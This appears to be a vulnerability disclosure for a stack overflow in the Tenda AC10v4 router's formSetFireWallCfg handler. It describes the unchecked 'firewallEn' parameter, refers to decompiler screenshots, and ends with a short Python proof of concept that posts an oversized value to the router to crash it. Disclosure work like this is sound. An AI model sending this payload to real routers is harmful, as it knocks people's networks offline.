# Notification of Stack Overflow Vulnerability in Tenda AC10v4 Router (Version V16.03.10.13) by Shenzhen Tenda Technology 

Router Firmware Download: [https://www.tenda.com.cn/material/show/103506](https://www.tenda.com.cn/material/show/103506)

Vulnerability URLï¼šhttp://192.168.100.135/goform/SetFirewallCfg

The payload is at the bottom of the article

The vulnerability occurs at the function `formSetFireWallCfg`.

![image](https://github.com/xubeining/Cve_report/blob/main/photoforstackoverflow1.png)
![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow2.png)

The program retrieves the user input parameter "firewallEn" but does not perform size checks.  
When the parameter input is too large, it causes a stack overflow, leading to a crash or potential exploitation.  
The issue is located in the `formSetFireWallCfg` function, which is referenced by `formDefineTenDa` at line 28.

![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow3.png)

The issue can be further cross-referenced to `FUN_0043b3d8`, with particular attention to lines 50 and 53.

![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow4.png)

The vulnerability occurs on the page path: `goform/SetFirewallCfg`.

## Now, let's proceed with the reproduction.

![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow5.png)

![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow6.png)

Now, run the script.

![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow7.png)
![image](https://github.com/xubeining/Cve_report/blob/main/photostackoverflow8.png)

The router crashes, and the website becomes inaccessible.

## Payload
```python
import requests

url = "http://192.168.100.135/goform/SetFirewallCfg"
payload = {
    'firewallEn': b'a' * 100000
}
res = requests.post(url=url, data=payload)
